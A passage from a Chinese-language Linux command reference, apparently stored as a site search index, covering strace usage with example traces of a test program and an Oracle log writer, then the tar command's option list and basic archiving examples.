-Ssortby ]\n    [ command [ arg...  ] ]\n```\n\n###  选项\n\n```shell\n-c 统计每一系统调用的所执行的时间,次数和出错的次数等.\n-d 输出strace关于标准错误的调试信息.\n-f 跟踪由fork调用所产生的子进程.\n-ff 如果提供-o filename,则所有进程的跟踪结果输出到相应的filename.pid中,pid是各进程的进程号.\n-F 尝试跟踪vfork调用.在-f时,vfork不被跟踪.\n-h 输出简要的帮助信息.\n-i 输出系统调用的入口指针.\n-q 禁止输出关于脱离的消息.\n-r 打印出相对时间关于,,每一个系统调用.\n-t 在输出中的每一行前加上时间信息.\n-tt 在输出中的每一行前加上时间信息,微秒级.\n-ttt 微秒级输出,以秒了表示时间.\n-T 显示每一调用所耗的时间.\n-v 输出所有的系统调用.一些调用关于环境变量,状态,输入输出等调用由于使用频繁,默认不输出.\n-V 输出strace的版本信息.\n-x 以十六进制形式输出非标准字符串\n-xx 所有字符串以十六进制形式输出.\n-a column 设置返回值的输出位置.默认 为40.\n-e expr 指定一个表达式,用来控制如何跟踪.格式：[qualifier=][!]value1[,value2]...\nqualifier只能是 trace,abbrev,verbose,raw,signal,read,write其中之一.value是用来限定的符号或数字.默认的 qualifier是 trace.感叹号是否定符号.例如:-eopen等价于 -e trace=open,表示只跟踪open调用.而-etrace!=open 表示跟踪除了open以外的其他调用.有两个特殊的符号 all 和 none. 注意有些shell使用!来执行历史记录里的命令,所以要使用\\\\.\n-e trace=set 只跟踪指定的系统 调用.例如:-e trace=open,close,rean,write表示只跟踪这四个系统调用.默认的为set=all.\n-e trace=file 只跟踪有关文件操作的系统调用.\n-e trace=process 只跟踪有关进程控制的系统调用.\n-e trace=network 跟踪与网络有关的所有系统调用.\n-e strace=signal 跟踪所有与系统信号有关的 系统调用\n-e trace=ipc 跟踪所有与进程通讯有关的系统调用\n-e abbrev=set 设定strace输出的系统调用的结果集.-v 等与 abbrev=none.默认为abbrev=all.\n-e raw=set 将指定的系统调用的参数以十六进制显示.\n-e signal=set 指定跟踪的系统信号.默认为all.如 signal=!SIGIO(或者signal=!io),表示不跟踪SIGIO信号.\n-e read=set 输出从指定文件中读出 的数据.例如: -e read=3,5\n-e write=set 输出写入到指定文件中的数据.\n-o filename 将strace的输出写入文件filename\n-p pid 跟踪指定的进程pid.\n-s strsize 指定输出的字符串的最大长度.默认为32.文件名一直全部输出.\n-u username 以username的UID和GID执行被跟踪的命令\n```\n\n###  实例\n\n **追踪系统调用** \n\n现在我们做一个很简单的程序来演示strace的基本用法。这个程序的C语言代码如下：\n\n```shell\n# filename test.c\n#include <stdio.h>\n\nint main()\n{\n    int a;\n    scanf(\"%d\", &a);\n    printf(\"%09d\\n\", a);\n    return 0;\n}\n```\n\n然后我们用`gcc -o test test.c`编译一下，得到一个可执行的文件test。然后用strace调用执行：\n\n```shell\nstrace ./test\n```\n\n执行期间会要求你输入一个整数，我们输入99，最后得到如下的结果：\n\n```shell\n// 直接执行test的结果\noracle@orainst[orcl]:~ $./test\n\n// 执行的结果\n99\n000000099\n\n// 通过strace执行test的结果\noracle@orainst[orcl]:~ $strace ./test\n\n// strace的trace结果\nexecve(\"./test\", [\"./test\"], [/* 41 vars */]) = 0\nuname({sys=\"Linux\", node=\"orainst.desktop.mycompany.com\", ...}) = 0\nbrk(0)                                  = 0x8078000\nfstat64(3, {st_mode=S_IFREG|0644, st_size=65900, ...}) = 0\nold_mmap(NULL, 65900, PROT_READ, MAP_PRIVATE, 3, 0) = 0xbf5ef000\nclose(3)                                = 0\nopen(\"/lib/tls/libc.so.6\", O_RDONLY)    = 3\nread(3, \"\\177ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\\3\\0\\1\\0\\0\\0\\200X\\1\"..., 512) = 512\nfstat64(3, {st_mode=S_IFREG|0755, st_size=1571692, ...}) = 0\nold_mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xbf5ee000\nold_mmap(NULL, 1275340, PROT_READ|PROT_EXEC, MAP_PRIVATE, 3, 0) = 0xa02000\nold_mmap(0xb34000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED, 3, 0x132000) = 0xb34000\nold_mmap(0xb37000, 9676, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb37000\nclose(3)                                = 0\nset_thread_area({entry_number:-1 -> 6, base_addr:0xbf5ee740, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0\nmunmap(0xbf5ef000, 65900)               = 0\nfstat64(0, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0\nmmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xbf5ff000\nread(0, 99\n\"99\\n\", 1024)                   = 3\nfstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0\nmmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xbf5fe000\nwrite(1, \"000000099\\n\", 10000000099\n)             = 10\nmunmap(0xbf5fe000, 4096)                = 0\nexit_group(0)                           = ?\n```\n\n从trace结构可以看到，系统首先调用execve开始一个新的进行，接着进行些环境的初始化操作，最后停顿在”read(0,”上面，这也就是执行到了我们的scanf函数，等待我们输入数字呢，在输入完99之后，在调用write函数将格式化后的数值”000000099″输出到屏幕，最后调用exit_group退出进行，完成整个程序的执行过程。\n\n **跟踪信号传递** \n\n我们还是使用上面的那个test程序，来观察进程接收信号的情况。还是先`strace ./test`，等到等待输入的画面的时候不要输入任何东西，然后打开另外一个窗口，输入如下的命令\n\n```shell\nkillall test\n```\n\n这时候就能看到我们的程序推出了，最后的trace结果如下：\n\n```shell\noracle@orainst[orcl]:~\n$strace ./test\n\nexecve(\"./test\", [\"./test\"], [/* 41 vars */]) = 0\nuname({sys=\"Linux\", node=\"orainst.desktop.mycompany.com\", ...}) = 0\nbrk(0)                                  = 0x9ae2000\nold_mmap(NULL, 65900, PROT_READ, MAP_PRIVATE, 3, 0) = 0xbf5ef000\nclose(3)                                = 0\nopen(\"/lib/tls/libc.so.6\", O_RDONLY)    = 3\nread(3, \"\\177ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\\3\\0\\1\\0\\0\\0\\200X\\1\"..., 512) = 512\nfstat64(3, {st_mode=S_IFREG|0755, st_size=1571692, ...}) = 0\nold_mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xbf5ee000\nold_mmap(NULL, 1275340, PROT_READ|PROT_EXEC, MAP_PRIVATE, 3, 0) = 0x2e9000\nold_mmap(0x41b000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED, 3, 0x132000) = 0x41b000\nold_mmap(0x41e000, 9676, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x41e000\nclose(3)                                = 0\nset_thread_area({entry_number:-1 -> 6, base_addr:0xbf5ee740, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0\nmunmap(0xbf5ef000, 65900)               = 0\nfstat64(0, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0\nmmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xbf5ff000\nread(0, 0xbf5ff000, 1024)               = ? ERESTARTSYS (To be restarted)\n--- SIGTERM (Terminated) @ 0 (0) ---\n+++ killed by SIGTERM +++\n```\n\ntrace中很清楚的告诉你test进程”+++ killed by SIGTERM +++”。\n\n **系统调用统计** \n\nstrace不光能追踪系统调用，通过使用参数-c，它还能将进程所有的系统调用做一个统计分析给你，下面就来看看strace的统计，这次我们执行带-c参数的strace：\n\nstrace -c ./test\n\n最后能得到这样的trace结果：\n\n```shell\noracle@orainst[orcl]:~\n$strace -c ./test\n```\n\n```shell\nexecve(\"./test\", [\"./test\"], [/* 41 vars */]) = 0\n% time     seconds  usecs/call     calls    errors syscall\n------ ----------- ----------- --------- --------- ----------------\n 45.90    0.000140           5        27        25 open\n 34.43    0.000105           4        24        21 stat64\n  7.54    0.000023           5         5           old_mmap\n  2.62    0.000008           8         1           munmap\n  1.97    0.000006           6         1           uname\n  1.97    0.000006           2         3           fstat64\n  1.64    0.000005           3         2         1 read\n  1.31    0.000004           2         2           close\n  0.98    0.000003           3         1           brk\n  0.98    0.000003           3         1           mmap2\n  0.66    0.000002           2         1           set_thread_area\n------ ----------- ----------- --------- --------- ----------------\n100.00    0.000305                    68        47 total\n```\n\n这里很清楚的告诉你调用了那些系统函数，调用次数多少，消耗了多少时间等等这些信息，这个对我们分析一个程序来说是非常有用的。\n\n###  常用参数说明\n\n除了-c参数之外，strace还提供了其他有用的参数给我们，让我们能很方便的得到自己想要的信息，下面就对那些常用的参数一一做个介绍。\n\n **重定向输出** \n\n参数-o用在将strace的结果输出到文件中，如果不指定-o参数的话，默认的输出设备是STDERR，也就是说使用”-o filename”和” 2>filename”的结果是一样的。\n\n```shell\n# 这两个命令都是将strace结果输出到文件test.txt中\nstrace -c -o test.txt ./test\nstrace -c ./test  2>test.txt\n```\n\n **对系统调用进行计时** \n\nstrace可以使用参数-T将每个系统调用所花费的时间打印出来，每个调用的时间花销现在在调用行最右边的尖括号里面。\n\n```shell\noracle@orainst[orcl]:~\n$strace -T ./test\n\n// 这里只摘录部分结果\nread(0, 1\n\"1\\n\", 1024)                    = 2 <2.673455>\nfstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0 <0.000014>\nmmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xbf5fe000 <0.000017>\nwrite(1, \"000000001\\n\", 10000000001\n)             = 10 <0.000016>\nmunmap(0xbf5fe000, 4096)                = 0 <0.000020>\nexit_group(0)                           = ?\n```\n\n **系统调用的时间** \n\n这是一个很有用的功能，strace会将每次系统调用的发生时间记录下来，只要使用-t/tt/ttt三个参数就可以看到效果了，具体的例子可以自己去尝试。\n\n参数名 | 输出样式 | 说明\n--- | --- | ---\n-t | 10:33:04 exit_group(0) | 输出结果精确到秒\n-tt | 10:33:48.159682 exit_group(0) | 输出结果精确到微妙\n-ttt | 1262169244.788478 exit_group(0) | 精确到微妙，而且时间表示为unix时间戳\n\n **截断输出** \n\n-s参数用于指定trace结果的每一行输出的字符串的长度，下面看看test程序中-s参数对结果有什么影响，现指定-s为20，然后在read的是是很我们输入一个超过20个字符的数字串\n\n```shell\nstrace -s 20 ./test\n\nread(0, 2222222222222222222222222      // 我们输入的2一共有25个\n\"22222222222222222222\"..., 1024) = 26  // 而我们看到的结果中2只有20个\n```\n\n **trace一个现有的进程** \n\nstrace不光能自己初始化一个进程进行trace，还能追踪现有的进程，参数-p就是取这个作用的，用法也很简单，具体如下。\n\n```shell\nstrace -p pid\n```\n\n###  综合例子\n\n说了那么多的功能和参数，现在我们来一个实用点的，就是研究下Oracle的lgwr进程，看看这个进程是不是像文档所说的那样没3s钟写一次log文件，考虑到lgwr写日志的触发条件比较多，我们需要找一个空闲的Oracle实例做这个实验。\n\n我们先要得到lgwr进程的pid，运行下面的命令\n\n```shell\nps -ef|grep lgwr\n\noracle    5912     1  0 Nov12 ?        00:14:56 ora_lgwr_orcl\n```\n\n得到lgwr的pid是5912，现在启动strace，然后将trace的几个输出到lgwr.txt文件中，执行下面的命令\n\n```shell\nstrace -tt -s 10 -o lgwr.txt -p 5912\n```\n\n过一会之后停止strace，然后查看结果。由于输出的结果比较多，为了方便我们只看Oracle写入log文件时用的pwrite函数的调用\n\n```shell\ngrep pwrite\\(20 lgwr.txt\n```\n\n等等，为什么grep的时候用的是”pwrite(2″呢？，因为我知道我这个机器打开的当前的log文件的句柄编号都是2开始的。具体查找方法是先使用下面的语句找出当前活动的日志文件都有哪些：\n\n```shell\nselect member, v$log.status from v$log, v$logfile\nwhere v$log.group#=v$logfile.group#;\n```\n\n得到\n\n```shell\nMEMBER                                             STATUS\n-------------------------------------------------- ----------------\n/db/databases/orcl/redo-01-a/redo-t01-g03-m1.log    INACTIVE\n/db/databases/orcl/redo-03-a/redo-t01-g03-m2.log    INACTIVE\n/db/databases/orcl/redo-02-a/redo-t01-g02-m1.log    CURRENT\n/db/databases/orcl/redo-04-a/redo-t01-g02-m2.log    CURRENT\n/db/databases/orcl/redo-01-a/redo-t01-g01-m1.log    INACTIVE\n/db/databases/orcl/redo-03-a/redo-t01-g01-m2.log    INACTIVE\n/db/databases/orcl/redo-02-a/redo-t01-g04-m1.log    INACTIVE\n/db/databases/orcl/redo-04-a/redo-t01-g04-m2.log    INACTIVE\n```\n\n然后到/proc中去找打开文件的句柄：\n\n```shell\nll /proc/.5912/fd/\n```\n\n得到\n\n```shell\nlrwx------    1 oracle   dba            64 Dec 30 10:55 18 -> /db/databases/orcl/redo-01-a/redo-t01-g01-m1.log\nlrwx------    1 oracle   dba            64 Dec 30 10:55 19 -> /db/databases/orcl/redo-03-a/redo-t01-g01-m2.log\nlrwx------    1 oracle   dba            64 Dec 30 10:55 20 -> /db/databases/orcl/redo-02-a/redo-t01-g02-m1.log\nlrwx------    1 oracle   dba            64 Dec 30 10:55 21 -> /db/databases/orcl/redo-04-a/redo-t01-g02-m2.log\nlrwx------    1 oracle   dba            64 Dec 30 10:55 22 -> /db/databases/orcl/redo-01-a/redo-t01-g03-m1.log\nlrwx------    1 oracle   dba            64 Dec 30 10:55 23 -> /db/databases/orcl/redo-03-a/redo-t01-g03-m2.log\nlrwx------    1 oracle   dba            64 Dec 30 10:55 24 -> /db/databases/orcl/redo-02-a/redo-t01-g04-m1.log\nlrwx------    1 oracle   dba            64 Dec 30 10:55 25 -> /db/databases/orcl/redo-04-a/redo-t01-g04-m2.log\n```\n\n现在能看到我机器当前日志文件的句柄分别是20和21。\n\n现在我们得到如下结果\n\n```shell\n11:13:55.603245 pwrite(20, \"\\1\\\"\\0\\0J!\"..., 1536, 4363264) = 1536\n11:13:55.603569 pwrite(21, \"\\1\\\"\\0\\0J!\"..., 1536, 4363264) = 1536\n11:13:55.606888 pwrite(20, \"\\1\\\"\\0\\0M!\"..., 1536, 4364800) = 1536\n11:13:55.607172 pwrite(21, \"\\1\\\"\\0\\0M!\"..., 1536, 4364800) = 1536\n11:13:55.607934 pwrite(20, \"\\1\\\"\\0\\0P!\"..., 1536, 4366336) = 1536\n11:13:55.608199 pwrite(21, \"\\1\\\"\\0\\0P!\"..., 1536, 4366336) = 1536\n11:13:55.610260 pwrite(20, \"\\1\\\"\\0\\0S!\"..., 1536, 4367872) = 1536\n11:13:55.610530 pwrite(21, \"\\1\\\"\\0\\0S!\"..., 1536, 4367872) = 1536\n11:14:00.602446 pwrite(20, \"\\1\\\"\\0\\0V!\"..., 1536, 4369408) = 1536\n11:14:00.602750 pwrite(21, \"\\1\\\"\\0\\0V!\"..., 1536, 4369408) = 1536\n11:14:00.606386 pwrite(20, \"\\1\\\"\\0\\0Y!\"..., 1536, 4370944) = 1536\n11:14:00.606676 pwrite(21, \"\\1\\\"\\0\\0Y!\"..., 1536, 4370944) = 1536\n11:14:00.607900 pwrite(20, \"\\1\\\"\\0\\0\\\\\"..., 1024, 4372480) = 1024\n11:14:00.608161 pwrite(21, \"\\1\\\"\\0\\0\\\\\"..., 1024, 4372480) = 1024\n11:14:00.608816 pwrite(20, \"\\1\\\"\\0\\0^!\"..., 1024, 4373504) = 1024\n11:14:00.609071 pwrite(21, \"\\1\\\"\\0\\0^!\"..., 1024, 4373504) = 1024\n11:14:00.611142 pwrite(20, \"\\1\\\"\\0\\0`!\"..., 1536, 4374528) = 1536\n11:14:00.611454 pwrite(21, \"\\1\\\"\\0\\0`!\"..., 1536, 4374528) = 1536\n11:14:05.602804 pwrite(20, \"\\1\\\"\\0\\0c!\"..., 1024, 4376064) = 1024\n11:14:05.603119 pwrite(21, \"\\1\\\"\\0\\0c!\"..., 1024, 4376064) = 1024\n11:14:05.607731 pwrite(20, \"\\1\\\"\\0\\0e!\"..., 1024, 4377088) = 1024\n11:14:05.608020 pwrite(21, \"\\1\\\"\\0\\0e!\"..., 1024, 4377088) = 1024\n11:14:05.608690 pwrite(20, \"\\1\\\"\\0\\0g!\"..., 1024, 4378112) = 1024\n11:14:05.608962 pwrite(21, \"\\1\\\"\\0\\0g!\"..., 1024, 4378112) = 1024\n11:14:05.611022 pwrite(20, \"\\1\\\"\\0\\0i!\"..., 1536, 4379136) = 1536\n11:14:05.611283 pwrite(21, \"\\1\\\"\\0\\0i!\"..., 1536, 4379136) = 1536\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","strace"]},{"title":"【Linux 命令】tar","url":"/linux-command/tar/","content":"\n将许多文件一起保存至一个单独的磁带或磁盘归档，并能从归档中单独还原所需文件。\n\n## 补充说明\n\n**tar命令** 可以为linux的文件和目录创建档案。利用tar，可以为某一特定文件创建档案（备份文件），也可以在档案中改变文件，或者向档案中加入新的文件。tar最初被用来在磁带上创建档案，现在，用户可以在任何设备上创建档案。利用tar命令，可以把一大堆的文件和目录全部打包成一个文件，这对于备份文件或将几个文件组合成为一个文件以便于网络传输是非常有用的。\n\n首先要弄清两个概念：打包和压缩。打包是指将一大堆文件或目录变成一个总的文件；压缩则是将一个大的文件通过一些压缩算法变成一个小文件。\n\n为什么要区分这两个概念呢？这源于Linux中很多压缩程序只能针对一个文件进行压缩，这样当你想要压缩一大堆文件时，你得先将这一大堆文件先打成一个包（tar命令），然后再用压缩程序进行压缩（gzip bzip2命令）。\n\n### 语法\n\n```shell\ntar [选项...] [FILE]...\n```\n\n### 选项\n\n```shell\n-A, --catenate, --concatenate   追加 tar 文件至归档\n-c, --create               创建一个新归档\n-d, --diff, --compare      找出归档和文件系统的差异\n    --delete               从归档(非磁带！)中删除\n-r, --append               追加文件至归档结尾\n-t, --list                 列出归档内容\n    --test-label           测试归档卷标并退出\n-u, --update               仅追加比归档中副本更新的文件\n-x, --extract, --get       从归档中解出文件\n\n操作修饰符:\n\n      --check-device         当创建增量归档时检查设备号(默认)\n  -g, --listed-incremental=FILE   处理新式的 GNU 格式的增量备份\n  -G, --incremental          处理老式的 GNU 格式的增量备份\n      --ignore-failed-read\n                             当遇上不可读文件时不要以非零值退出\n      --level=NUMBER         所创建的增量列表归档的输出级别\n  -n, --seek                 归档可检索\n      --no-check-device      当创建增量归档时不要检查设备号\n      --no-seek              归档不可检索\n      --occurrence[=NUMBER]  仅处理归档中每个文件的第 NUMBER\n                             个事件；仅当与以下子命令 --delete,\n                             --diff, --extract 或是 --list\n                             中的一个联合使用时，此选项才有效。而且不管文件列表是以命令行形式给出或是通过\n                             -T 选项指定的；NUMBER 值默认为 1\n      --sparse-version=MAJOR[.MINOR]\n                             设置所用的离散格式版本(隐含\n                             --sparse)\n  -S, --sparse               高效处理离散文件\n\n 重写控制:\n\n  -k, --keep-old-files       don't replace existing files when extracting,\n                             treat them as errors\n      --keep-directory-symlink   preserve existing symlinks to directories when\n                             extracting\n      --keep-newer-files\n                             不要替换比归档中副本更新的已存在的文件\n      --no-overwrite-dir     保留已存在目录的元数据\n      --overwrite            解压时重写存在的文件\n      --overwrite-dir        解压时重写已存在目录的元数据(默认)\n\n      --recursive-unlink     解压目录之前先清除目录层次\n      --remove-files         在添加文件至归档后删除它们\n      --skip-old-files       don't replace existing files when extracting,\n                             silently skip over them\n  -U, --unlink-first         在解压要重写的文件之前先删除它们\n  -W, --verify               在写入以后尝试校验归档\n\n 选择输出流:\n\n      --ignore-command-error 忽略子进程的退出代码\n      --no-ignore-command-error\n                             将子进程的非零退出代码认为发生错误\n  -O, --to-stdout            解压文件至标准输出\n      --to-command=COMMAND\n                             将解压的文件通过管道传送至另一个程序\n\n 操作文件属性:\n\n      --atime-preserve[=METHOD]\n                             在输出的文件上保留访问时间，要么通过在读取(默认\n                             METHOD=‘replace’)后还原时间，要不就不要在第一次(METHOD=‘system’)设置时间\n      --delay-directory-restore\n                             直到解压结束才设置修改时间和所解目录的权限\n      --group=名称         强制将 NAME\n                             作为所添加的文件的组所有者\n      --mode=CHANGES         强制将所添加的文件(符号)更改为权限\n                             CHANGES\n      --mtime=DATE-OR-FILE   从 DATE-OR-FILE 中为添加的文件设置\n                             mtime\n  -m, --touch                不要解压文件的修改时间\n      --no-delay-directory-restore\n                             取消 --delay-directory-restore 选项的效果\n      --no-same-owner\n                             将文件解压为您所有(普通用户默认此项)\n      --no-same-permissions\n                             从归档中解压权限时使用用户的掩码位(默认为普通用户服务)\n      --numeric-owner        总是以数字代表用户/组的名称\n      --owner=名称         强制将 NAME\n                             作为所添加的文件的所有者\n  -p, --preserve-permissions, --same-permissions\n                             解压文件权限信息(默认只为超级用户服务)\n      --preserve             与 -p 和 -s 一样\n      --same-owner\n                             尝试解压时保持所有者关系一致(超级用户默认此项)\n  -s, --preserve-order, --same-order\n                             member arguments are listed in the same order as\n                             the files in the archive\n\n Handling of extended file attributes:\n\n      --acls                 Enable the POSIX ACLs support\n      --no-acls              Disable the POSIX ACLs support\n      --no-selinux           Disable the SELinux context support\n      --no-xattrs            Disable extended attributes support\n      --selinux              Enable the SELinux context support\n      --xattrs               Enable extended attributes support\n      --xattrs-exclude=MASK  specify the exclude pattern for xattr keys\n      --xattrs-include=MASK  specify the include pattern for xattr keys\n\n 设备选择和切换:\n\n  -f, --file=ARCHIVE         使用归档文件或 ARCHIVE 设备\n      --force-local\n                             即使归档文件存在副本还是把它认为是本地归档\n  -F, --info-script=名称, --new-volume-script=名称\n                             在每卷磁带最后运行脚本(隐含 -M)\n  -L, --tape-length=NUMBER   写入 NUMBER × 1024 字节后更换磁带\n  -M, --multi-volume         创建/列出/解压多卷归档文件\n      --rmt-command=COMMAND  使用指定的 rmt COMMAND 代替 rmt\n      --rsh-command=COMMAND  使用远程 COMMAND 代替 rsh\n      --volno-file=FILE      使用/更新 FILE 中的卷数\n\n 设备分块:\n\n  -b, --blocking-factor=BLOCKS   每个记录 BLOCKS x 512 字节\n  -B, --read-full-records    读取时重新分块(只对 4.2BSD 管道有效)\n  -i, --ignore-zeros         忽略归档中的零字节块(即文件结尾)\n      --record-size=NUMBER   每个记录的字节数 NUMBER，乘以 512\n\n 选择归档格式:\n\n  -H, --format=FORMAT        创建指定格式的归档\n\n FORMAT 是以下格式中的一种:\n\n    gnu                      GNU tar 1.13.x 格式\n    oldgnu                   GNU 格式 as per tar <= 1.12\n    pax                      POSIX 1003.1-2001 (pax) 格式\n    posix                    等同于 pax\n    ustar                    POSIX 1003.1-1988 (ustar) 格式\n    v7                       old V7 tar 格式\n\n      --old-archive, --portability\n                             等同于 --format=v7\n      --pax-option=关键字[[:]=值][,关键字[[:]=值]]...\n                             控制 pax 关键字\n      --posix                等同于 --format=posix\n  -V, --label=TEXT           创建带有卷名 TEXT\n                             的归档；在列出/解压时，使用 TEXT\n                             作为卷名的模式串\n\n 压缩选项:\n\n  -a, --auto-compress        使用归档后缀名来决定压缩程序\n  -I, --use-compress-program=PROG\n                             通过 PROG 过滤(必须是能接受 -d\n                             选项的程序)\n  -j, --bzip2                通过 bzip2 过滤归档\n  -J, --xz                   通过 xz 过滤归档\n      --lzip                 通过 lzip 过滤归档\n      --lzma                 通过 lzma 过滤归档\n      --lzop\n      --no-auto-compress     不使用归档后缀名来决定压缩程序\n  -z, --gzip, --gunzip, --ungzip   通过 gzip 过滤归档\n  -Z, --compress, --uncompress   通过 compress 过滤归档\n\n 本地文件选择:\n\n      --add-file=FILE        添加指定的 FILE 至归档(如果名字以 -\n                             开始会很有用的)\n      --backup[=CONTROL]     在删除前备份，选择 CONTROL 版本\n  -C, --directory=DIR        改变至目录 DIR\n      --exclude=PATTERN      排除以 PATTERN 指定的文件\n      --exclude-backups      排除备份和锁文件\n      --exclude-caches       除标识文件本身外，排除包含\n                             CACHEDIR.TAG 的目录中的内容\n      --exclude-caches-all   排除包含 CACHEDIR.TAG 的目录\n      --exclude-caches-under 排除包含 CACHEDIR.TAG 的目录中所有内容\n\n      --exclude-tag=FILE     除 FILE 自身外，排除包含 FILE\n                             的目录中的内容\n      --exclude-tag-all=FILE 排除包含 FILE 的目录\n      --exclude-tag-under=FILE   排除包含 FILE 的目录中的所有内容\n      --exclude-vcs          排除版本控制系统目录\n  -h, --dereference\n                             跟踪符号链接；将它们所指向的文件归档并输出\n      --hard-dereference\n                             跟踪硬链接；将它们所指向的文件归档并输出\n  -K, --starting-file=MEMBER-NAME\n                             begin at member MEMBER-NAME when reading the\n                             archive\n      --newer-mtime=DATE     当只有数据改变时比较数据和时间\n      --no-null              禁用上一次的效果 --null 选项\n      --no-recursion         避免目录中的自动降级\n      --no-unquote           不以 -T 读取的文件名作为引用结束\n      --null                 -T 读取以空终止的名字，-C 禁用\n  -N, --newer=DATE-OR-FILE, --after-date=DATE-OR-FILE\n                             只保存比 DATE-OR-FILE 更新的文件\n      --one-file-system      创建归档时保存在本地文件系统中\n  -P, --absolute-names       不要从文件名中清除引导符‘/’\n      --recursion            目录递归(默认)\n      --suffix=STRING        在删除前备份，除非被环境变量\n                             SIMPLE_BACKUP_SUFFIX\n                             覆盖，否则覆盖常用后缀(‘’)\n  -T, --files-from=FILE      从 FILE\n                             中获取文件名来解压或创建文件\n      --unquote              以 -T\n                             读取的文件名作为引用结束(默认)\n  -X, --exclude-from=FILE    排除 FILE 中列出的模式串\n\n 文件名变换:\n\n      --strip-components=NUMBER   解压时从文件名中清除 NUMBER\n                             个引导部分\n      --transform=EXPRESSION, --xform=EXPRESSION\n                             使用 sed 代替 EXPRESSION\n                             来进行文件名变换\n\n 文件名匹配选项(同时影响排除和包括模式串):\n\n      --anchored             模式串匹配文件名头部\n      --ignore-case          忽略大小写\n      --no-anchored          模式串匹配任意‘/’后字符(默认对\n                             exclusion 有效)\n      --no-ignore-case       匹配大小写(默认)\n      --no-wildcards         逐字匹配字符串\n      --no-wildcards-match-slash   通配符不匹配‘/’\n      --wildcards            use wildcards (default)\n      --wildcards-match-slash\n                             通配符匹配‘/’(默认对排除操作有效)\n\n 提示性输出:\n\n      --checkpoint[=NUMBER]  每隔 NUMBER\n                             个记录显示进度信息(默认为 10 个)\n      --checkpoint-action=ACTION   在每个检查点上执行 ACTION\n      --full-time            print file time to its full resolution\n      --index-file=FILE      将详细输出发送至 FILE\n  -l, --check-links\n                             只要不是所有链接都被输出就打印信息\n      --no-quote-chars=STRING   禁用来自 STRING 的字符引用\n      --quote-chars=STRING   来自 STRING 的额外的引用字符\n      --quoting-style=STYLE  设置名称引用风格；有效的 STYLE\n                             值请参阅以下说明\n  -R, --block-number         每个信息都显示归档内的块数\n      --show-defaults        显示 tar 默认选项\n      --show-omitted-dirs\n                             列表或解压时，列出每个不匹配查找标准的目录\n      --show-transformed-names, --show-stored-names\n                             显示变换后的文件名或归档名\n      --totals[=SIGNAL]      处理归档后打印出总字节数；当此\n                             SIGNAL 被触发时带参数 -\n                             打印总字节数；允许的信号为:\n                             SIGHUP，SIGQUIT，SIGINT，SIGUSR1 和\n                             SIGUSR2；同时也接受不带 SIG\n                             前缀的信号名称\n      --utc                  以 UTC 格式打印文件修改时间\n  -v, --verbose              详细地列出处理的文件\n      --warning=KEYWORD      警告控制:\n  -w, --interactive, --confirmation\n                             每次操作都要求确认\n\n 兼容性选项:\n\n  -o                         创建归档时，相当于\n                             --old-archive；展开归档时，相当于\n                             --no-same-owner\n\n 其它选项:\n\n  -?, --help                 显示此帮助列表\n      --restrict             禁用某些潜在的有危险的选项\n      --usage                显示简短的用法说明\n      --version              打印程序版本\n\n长选项和相应短选项具有相同的强制参数或可选参数。\n\n除非以 --suffix 或 SIMPLE_BACKUP_SUFFIX\n设置备份后缀，否则备份后缀就是“~”。\n可以用 --backup 或 VERSION_CONTROL 设置版本控制，可能的值为：\n\n  none, off\t   从不做备份\n  t, numbered     进行编号备份\n  nil, existing\n如果编号备份存在则进行编号备份，否则进行简单备份\n  never, simple   总是使用简单备份\n\n--quoting-style 选项的有效参数为:\n\n  literal\n  shell\n  shell-always\n  c\n  c-maybe\n  escape\n  locale\n  clocale\n\n此 tar 默认为:\n--format=gnu -f- -b20 --quoting-style=escape --rmt-command=/etc/rmt\n--rsh-command=/usr/bin/ssh\n```\n\n### 参数\n\n文件或目录：指定要打包的文件或目录列表。\n\n### 实例\n\n```shell\n- z：有gzip属性的\n- j：有bz2属性的\n- Z：有compress属性的\n- v：显示所有过程\n- O：将文件解开到标准输出\n```\n\n```shell\ntar -cf archive.tar foo bar  # 从文件 foo 和 bar 创建归档文件 archive.tar。\ntar -tvf archive.tar         # 详细列举归档文件 archive.tar 中的所有文件。\ntar -xf archive.tar          # 展开归档文件 archive.tar 中的所有文件。\n```\n\n\n下面的参数-f是必须的\n\n-f: 使用档案名字，切记，这个参数是最后一个参数，后面只能接档案名。\n\n```shell\ntar -cf all.tar *.jpg\n# 这条命令是将所有.jpg的文件打成一个名为all.tar的包。-c是表示产生新的包，-f指定包的文件名。\n\ntar -rf all.tar *.gif\n# 这条命令是将所有.gif的文件增加到all.tar的包里面去。-r是表示增加文件的意思。\n\ntar -uf all.tar logo.gif\n# 这条命令是更新原来tar包all.tar中logo.gif文件，-u是表示更新文件的意思。\n\ntar -tf all.tar\n# 这条命令是列出all.tar包中所有文件，-t是列出文件的意思\n```\n\n```shell\ntar -cvf archive.tar foo bar  # 从文件foo和bar创建archive.tar。\ntar 